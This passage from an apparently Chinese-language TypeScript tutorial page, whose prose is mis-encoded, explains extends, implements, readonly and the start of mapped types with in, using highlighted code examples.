<li><code>P</code> æ˜¯å…ƒç»„ä¸­çš„å…ƒç´ ç±»å‹ï¼Œé€šè¿‡ <code>T[number]</code> æ¥è·å–ã€‚</li>
</ul>
<h3 data-id="heading-3">ç›¸å…³çŸ¥è¯†ç‚¹</h3>
<h4 data-id="heading-4"><code>extends</code></h4>




















<table><thead><tr><th>ä½¿ç”¨ç»´åº¦</th><th>æ ¸å¿ƒä½œç”¨</th><th>ç¤ºä¾‹åœºæ™¯</th></tr></thead><tbody><tr><td>ç±»å‹ç»´åº¦</td><td>åšç±»å‹çº¦æŸæˆ–æ¡ä»¶åˆ¤æ–­ï¼ˆç±»å‹ç¼–ç¨‹æ ¸å¿ƒï¼‰</td><td>é™å®šæ³›å‹èŒƒå›´ã€åˆ¤æ–­ç±»å‹æ˜¯å¦å…¼å®¹ã€æå–ç±»å‹ç‰‡æ®µ</td></tr><tr><td>è¯­æ³•ç»´åº¦</td><td>åšç»§æ‰¿ï¼ˆå¤ç”¨å·²æœ‰ç»“æ„ï¼‰</td><td>æ¥å£ç»§æ‰¿ã€ç±»ç»§æ‰¿</td></tr></tbody></table>
<h5 data-id="heading-5"><code>extends</code> åšç±»å‹çº¦æŸæˆ–æ¡ä»¶åˆ¤æ–­</h5>
<ol>
<li>æ³›å‹çº¦æŸï¼šé™å®šæ³›å‹çš„å–å€¼èŒƒå›´</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// çº¦æŸ T å¿…é¡»æ˜¯ã€Œæ‹¥æœ‰ length å±æ€§ã€çš„ç±»å‹ï¼ˆæ¯”å¦‚ string/æ•°ç»„ï¼‰</span>
<span class="hljs-keyword">function</span> getLength&lt;T <span class="hljs-keyword">extends</span> { <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span> }&gt;(<span class="hljs-attr">arg</span>: T): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> arg.<span class="hljs-property">length</span>;
}

<span class="hljs-comment">// åˆæ³•è°ƒç”¨ï¼ˆç¬¦åˆçº¦æŸï¼‰</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// âœ… string æœ‰ lengthï¼Œè¿”å› 5</span>
<span class="hljs-title function_">getLength</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// âœ… æ•°ç»„æœ‰ lengthï¼Œè¿”å› 3</span>

<span class="hljs-comment">// éæ³•è°ƒç”¨ï¼ˆè¶…å‡ºçº¦æŸï¼‰</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šnumber æ²¡æœ‰ length å±æ€§</span>
</code></pre>
<ol start="2">
<li>æ¡ä»¶ç±»å‹ï¼šç±»å‹ç‰ˆ <strong>ä¸‰å…ƒè¿ç®—ç¬¦</strong></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€ç¤ºä¾‹ï¼šåˆ¤æ–­ç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦ä¸²</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"test"</span>&gt;; <span class="hljs-comment">// trueï¼ˆç¬¦åˆï¼‰</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;; <span class="hljs-comment">// falseï¼ˆä¸ç¬¦åˆï¼‰</span>
</code></pre>
<p>åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹ï¼ˆè”åˆç±»å‹ä¸“ç”¨ï¼‰: å½“ <code>T</code> æ˜¯è”åˆç±»å‹æ—¶ï¼Œ<code>extends</code> ä¼šè‡ªåŠ¨æ‹†åˆ†è”åˆç±»å‹çš„æ¯ä¸ªæˆå‘˜ï¼Œé€ä¸ªåˆ¤æ–­åå†åˆå¹¶ç»“æœã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Union</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> | <span class="hljs-built_in">boolean</span>;

<span class="hljs-comment">// æ‹†åˆ†é€»è¾‘ï¼šstringâ†’stringï¼Œnumberâ†’neverï¼Œbooleanâ†’never â†’ åˆå¹¶ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">OnlyString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">OnlyString</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// Result = string</span>
</code></pre>
<p>æ³¨æ„ï¼šåªæœ‰æ³›å‹å‚æ•°æ˜¯ è£¸ç±»å‹ï¼ˆæ²¡æœ‰è¢« []/{} åŒ…è£¹ï¼‰æ—¶ï¼Œæ‰ä¼šè§¦å‘åˆ†å¸ƒå¼åˆ¤æ–­ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŒ…è£¹åä¸è§¦å‘åˆ†å¸ƒå¼ï¼Œæ•´ä½“åˆ¤æ–­ [string|number] æ˜¯å¦å…¼å®¹ [string]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDist</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">string</span>] ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result2</span> = <span class="hljs-title class_">NoDist</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// neverï¼ˆæ•´ä½“ä¸å…¼å®¹ï¼‰</span>
</code></pre>
<ol start="3">
<li>é…åˆ <code>infer</code>ï¼šæå–ç±»å‹ç‰‡æ®µï¼ˆé»„é‡‘ç»„åˆï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æå– Promise çš„è¿”å›å€¼ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer V&gt; ? V : T;

<span class="hljs-keyword">type</span> C = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// stringï¼ˆæå–æˆåŠŸï¼‰</span>
<span class="hljs-keyword">type</span> D = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// numberï¼ˆä¸æ»¡è¶³æ¡ä»¶ï¼Œè¿”å›åŸç±»å‹ï¼‰</span>
</code></pre>
<h5 data-id="heading-6"><code>extends</code> åšç»§æ‰¿ï¼ˆå¤ç”¨å·²æœ‰ç»“æ„ï¼‰</h5>
<ol>
<li>æ¥å£ç»§æ‰¿ï¼šå¤ç”¨ + æ‰©å±•å±æ€§</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// ç»§æ‰¿ Userï¼Œå¹¶æ‰©å±•æ–°å±æ€§</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span> | <span class="hljs-string">"super_admin"</span>; <span class="hljs-comment">// æ–°å¢æƒé™å±æ€§</span>
}

<span class="hljs-comment">// å¿…é¡»åŒ…å«ç»§æ‰¿çš„ + æ‰©å±•çš„æ‰€æœ‰å±æ€§</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">admin</span>: <span class="hljs-title class_">Admin</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span>
};

<span class="hljs-comment">// å¤šæ¥å£ç»§æ‰¿</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HasAge</span> { <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>; }
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span>, <span class="hljs-title class_">HasAge</span> {
  <span class="hljs-attr">className</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// åŒæ—¶ç»§æ‰¿ User + HasAge</span>
}
</code></pre>
<ol start="2">
<li>ç±»ç»§æ‰¿ï¼šå¤ç”¨çˆ¶ç±»çš„å±æ€§ / æ–¹æ³•</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-comment">// ç»§æ‰¿ Parent ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// å¿…é¡»è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼ˆåˆå§‹åŒ–çˆ¶ç±»å±æ€§ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  <span class="hljs-comment">// é‡å†™çˆ¶ç±»æ–¹æ³•</span>
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»åŸæ–¹æ³•</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old`</span>);
  }
}

<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">"æå››"</span>, <span class="hljs-number">10</span>);
child.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šHi, æå›› â†’ I'm 10 years old</span>
</code></pre>
<p>è¡¥å……ï¼šç±»å®ç°æ¥å£ç”¨ <code>implements</code>ï¼ˆä¸æ˜¯ <code>extends</code>ï¼‰</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰æ¥å£ï¼ˆå¥‘çº¦ï¼šè§„å®šå¿…é¡»æœ‰ idã€name å±æ€§ï¼Œä»¥åŠ greet æ–¹æ³•ï¼‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// ä»…å®šä¹‰æ–¹æ³•ç­¾åï¼Œæ— å®ç°</span>
}

<span class="hljs-comment">// ç±»å®ç°æ¥å£ï¼ˆå¿…é¡»ä¸¥æ ¼éµå®ˆå¥‘çº¦ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-comment">// å¿…é¡»å®ç°æ¥å£çš„æ‰€æœ‰å±æ€§</span>
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–å±æ€§</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// å¿…é¡»å®ç°æ¥å£çš„ greet æ–¹æ³•ï¼ˆå…·ä½“å®ç°ç”±ç±»è‡ªå·±å®šä¹‰ï¼‰</span>
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.id}</span>`</span>);
  }
}

<span class="hljs-comment">// å®ä¾‹åŒ–ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> emp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"å¼ ä¸‰"</span>);
emp.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šHi, I'm å¼ ä¸‰, ID: 1</span>


<span class="hljs-comment">// æ¥å£1ï¼šåŸºç¡€ä¿¡æ¯</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Identifiable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// æ¥å£2ï¼šå¯æ‰“å°</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printable</span> {
  <span class="hljs-title function_">printInfo</span>(): <span class="hljs-built_in">void</span>;
}

<span class="hljs-comment">// ç±»åŒæ—¶å®ç°ä¸¤ä¸ªæ¥å£ï¼ˆå¿…é¡»å®ç°æ‰€æœ‰æ¥å£çš„æˆå‘˜ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Identifiable</span>, <span class="hljs-title class_">Printable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// ç±»å¯æ‰©å±•æ¥å£å¤–çš„å±æ€§</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// å®ç° Identifiable çš„æ–¹æ³•</span>
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>;
  }

  <span class="hljs-comment">// å®ç° Printable çš„æ–¹æ³•</span>
  <span class="hljs-title function_">printInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Product: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getId()}</span>`</span>);
  }
}

<span class="hljs-keyword">const</span> product = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(<span class="hljs-number">100</span>, <span class="hljs-string">"æ‰‹æœº"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(product.<span class="hljs-title function_">getId</span>()); <span class="hljs-comment">// 100</span>
product.<span class="hljs-title function_">printInfo</span>(); <span class="hljs-comment">// Product: æ‰‹æœº, ID: 100</span>
</code></pre>
<h4 data-id="heading-7"><code>readonly</code></h4>
<ul>
<li>æ ¸å¿ƒä½œç”¨ï¼šæ ‡è®°åï¼Œç›®æ ‡ï¼ˆå±æ€§ / æ•°ç»„ / å…ƒç»„ï¼‰åªèƒ½åœ¨åˆå§‹åŒ–é˜¶æ®µèµ‹å€¼ï¼ˆæ¯”å¦‚æ¥å£å®ä¾‹åŒ–ã€ç±»æ„é€ å‡½æ•°ã€å˜é‡å£°æ˜æ—¶ï¼‰ï¼Œåç»­ä»»ä½•ä¿®æ”¹è¿ç®—éƒ½ä¼šè¢« TS ç¼–è¯‘å™¨æ‹¦æˆªæŠ¥é”™ï¼›</li>
<li>è¿è¡Œæ—¶ç‰¹æ€§ï¼š<code>readonly</code> ä»…åšç¼–è¯‘æ—¶æ£€æŸ¥ï¼Œä¸ä¼šç”Ÿæˆä»»ä½•é¢å¤– JS ä»£ç ï¼Œä¹Ÿæ— æ³•çœŸæ­£é˜»æ­¢è¿è¡Œæ—¶çš„ä¿®æ”¹ï¼ˆæ¯”å¦‚é€šè¿‡ç±»å‹æ–­è¨€ç»•å¼€çš„è¯ï¼Œè¿è¡Œæ—¶ä»èƒ½æ”¹ï¼‰ï¼›</li>
<li>ä¸ <code>const</code> çš„åŒºåˆ«ï¼š<code>const</code> æ˜¯å˜é‡å±‚é¢çš„ä¸å¯é‡æ–°èµ‹å€¼ï¼ˆä½†å˜é‡æŒ‡å‘çš„å¯¹è±¡ / æ•°ç»„å†…éƒ¨å±æ€§ä»å¯æ”¹ï¼‰ï¼Œ<code>readonly</code> æ˜¯å±æ€§ / ç±»å‹å±‚é¢çš„ä¸å¯ä¿®æ”¹ï¼ˆå˜é‡æœ¬èº«å¯é‡æ–°èµ‹å€¼ï¼Œé™¤éå˜é‡ä¹Ÿç”¨ <code>const</code>ï¼‰ã€‚</li>
</ul>
<p>å¸¸ç”¨ä½¿ç”¨åœºæ™¯ï¼š</p>
<ol>
<li>ä½œç”¨äºæ¥å£ / ç±»å‹åˆ«åçš„å±æ€§ï¼ˆæœ€åŸºç¡€ï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰å¸¦åªè¯»å±æ€§çš„æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// åªè¯»å±æ€§ï¼šåªèƒ½åˆå§‹åŒ–èµ‹å€¼ï¼Œåç»­ä¸å¯æ”¹</span>
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// æ™®é€šå±æ€§ï¼šå¯ä¿®æ”¹</span>
}

<span class="hljs-comment">// åˆå§‹åŒ–æ—¶èµ‹å€¼ï¼ˆåˆæ³•ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span> };

<span class="hljs-comment">// å°è¯•ä¿®æ”¹åªè¯»å±æ€§ï¼ˆæŠ¥é”™ï¼‰</span>
user.<span class="hljs-property">id</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šæ— æ³•åˆ†é…åˆ° "id"ï¼Œå› ä¸ºå®ƒæ˜¯åªè¯»å±æ€§</span>
<span class="hljs-comment">// ä¿®æ”¹æ™®é€šå±æ€§ï¼ˆåˆæ³•ï¼‰</span>
user.<span class="hljs-property">name</span> = <span class="hljs-string">"æå››"</span>; <span class="hljs-comment">// âœ… åˆæ³•</span>
</code></pre>
<ol start="2">
<li>ä½œç”¨äºç±»çš„å±æ€§: ç±»ä¸­ä½¿ç”¨ <code>readonly</code> æ ‡è®°å±æ€§ï¼Œåªèƒ½åœ¨<strong>å£°æ˜æ—¶</strong>æˆ–<strong>æ„é€ å‡½æ•°ä¸­</strong>èµ‹å€¼ï¼Œåç»­æ— æ³•ä¿®æ”¹</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// åªè¯»å±æ€§</span>
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// æ„é€ å‡½æ•°ä¸­ç»™ readonly å±æ€§èµ‹å€¼ï¼ˆå”¯ä¸€åˆæ³•çš„åç»­èµ‹å€¼æ–¹å¼ï¼‰</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-title function_">updateInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = <span class="hljs-number">100</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šid æ˜¯åªè¯»å±æ€§</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">"ç‹äº”"</span>; <span class="hljs-comment">// âœ… åˆæ³•</span>
  }
}

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"èµµå…­"</span>);
person.<span class="hljs-property">id</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šåªè¯»å±æ€§ä¸å¯ä¿®æ”¹</span>
</code></pre>
<ol start="3">
<li>ä½œç”¨äºæ•°ç»„ / å…ƒç»„ï¼ˆåªè¯»æ•°ç»„ï¼‰: <code>readonly</code> å¯æ ‡è®°æ•°ç»„ä¸º â€œåªè¯»æ•°ç»„â€ï¼Œç¦æ­¢ä¿®æ”¹æ•°ç»„å…ƒç´ ã€è°ƒç”¨ <code>push/pop</code> ç­‰ä¿®æ”¹æ–¹æ³•</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æ–¹å¼1ï¼šä½¿ç”¨ readonly ä¿®é¥°æ•°ç»„ç±»å‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">arr1</span>: <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
arr1.<span class="hljs-title function_">push</span>(<span class="hljs-number">4</span>); <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šreadonly æ•°ç»„ä¸å­˜åœ¨ push æ–¹æ³•</span>
arr1[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šæ— æ³•ä¿®æ”¹åªè¯»æ•°ç»„çš„å…ƒç´ </span>

<span class="hljs-comment">// æ–¹å¼2ï¼šä½¿ç”¨ ReadonlyArray&lt;T&gt; ç±»å‹ï¼ˆç­‰ä»·äº readonly T[]ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">arr2</span>: <span class="hljs-title class_">ReadonlyArray</span>&lt;<span class="hljs-built_in">string</span>&gt; = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>];
arr2.<span class="hljs-title function_">pop</span>(); <span class="hljs-comment">// âŒ æŠ¥é”™</span>

<span class="hljs-comment">// ä½œç”¨äºå…ƒç»„ï¼ˆåªè¯»å…ƒç»„ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Point</span> = <span class="hljs-keyword">readonly</span> [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>];
<span class="hljs-keyword">const</span> <span class="hljs-attr">point</span>: <span class="hljs-title class_">Point</span> = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>];
point[<span class="hljs-number">0</span>] = <span class="hljs-number">30</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šåªè¯»å…ƒç»„å…ƒç´ ä¸å¯ä¿®æ”¹</span>
</code></pre>
<ol start="4">
<li>ç»“åˆ <code>keyof</code> + <code>in</code> æ‰¹é‡åˆ›å»ºåªè¯»ç±»å‹ï¼ˆæ˜ å°„ç±»å‹ï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Product</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">price</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">stock</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// æ‰¹é‡åˆ›å»ºåªè¯»ç‰ˆæœ¬çš„ Productï¼ˆTS å†…ç½®çš„ Readonly&lt;T&gt; å°±æ˜¯è¿™ä¹ˆå®ç°çš„ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ReadonlyProduct</span> = {
  <span class="hljs-keyword">readonly</span> [K <span class="hljs-keyword">in</span> keyof <span class="hljs-title class_">Product</span>]: <span class="hljs-title class_">Product</span>[K];
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">product</span>: <span class="hljs-title class_">ReadonlyProduct</span> = { <span class="hljs-attr">name</span>: <span class="hljs-string">"æ‰‹æœº"</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">2999</span>, <span class="hljs-attr">stock</span>: <span class="hljs-number">100</span> };
product.<span class="hljs-property">price</span> = <span class="hljs-number">3999</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šprice æ˜¯åªè¯»å±æ€§</span>

<span class="hljs-comment">// TS å†…ç½®äº† Readonly&lt;T&gt;ï¼Œå¯ç›´æ¥ä½¿ç”¨ï¼ˆæ— éœ€æ‰‹åŠ¨å†™æ˜ å°„ç±»å‹ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">product2</span>: <span class="hljs-title class_">Readonly</span>&lt;<span class="hljs-title class_">Product</span>&gt; = { <span class="hljs-attr">name</span>: <span class="hljs-string">"ç”µè„‘"</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">5999</span>, <span class="hljs-attr">stock</span>: <span class="hljs-number">50</span> };
product2.<span class="hljs-property">stock</span> = <span class="hljs-number">60</span>; <span class="hljs-comment">// âŒ æŠ¥é”™</span>
</code></pre>
<ol start="5">
<li>åªè¯»ç´¢å¼•ç­¾åï¼šå¦‚æœç±»å‹ä½¿ç”¨ç´¢å¼•ç­¾åï¼Œä¹Ÿå¯ä»¥æ ‡è®°ä¸º <code>readonly</code>ï¼Œç¦æ­¢é€šè¿‡ç´¢å¼•ä¿®æ”¹å±æ€§</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åªè¯»ç´¢å¼•ç­¾åï¼šåªèƒ½è¯»å–ï¼Œä¸èƒ½ä¿®æ”¹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ReadonlyDict</span> = {
  <span class="hljs-keyword">readonly</span> [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">number</span>;
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">dict</span>: <span class="hljs-title class_">ReadonlyDict</span> = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> };
dict[<span class="hljs-string">"a"</span>] = <span class="hljs-number">3</span>; <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šç´¢å¼•ç­¾åæ˜¯åªè¯»çš„</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dict[<span class="hljs-string">"b"</span>]); <span class="hljs-comment">// âœ… åˆæ³•ï¼šä»…è¯»å–</span>
</code></pre>
<h4 data-id="heading-8"><code>in</code></h4>
<p><code>in</code> è¿ç®—ç¬¦ç”¨äºéå†è”åˆç±»å‹ä¸­çš„æ¯ä¸ªæˆå‘˜ï¼Œå°†å…¶è½¬æ¢ä¸ºæ˜ å°„ç±»å‹çš„å±æ€§åã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoKeys</span> = <span class="hljs-string">'title'</span> | <span class="hljs-string">'description'</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoPreview</span> = {
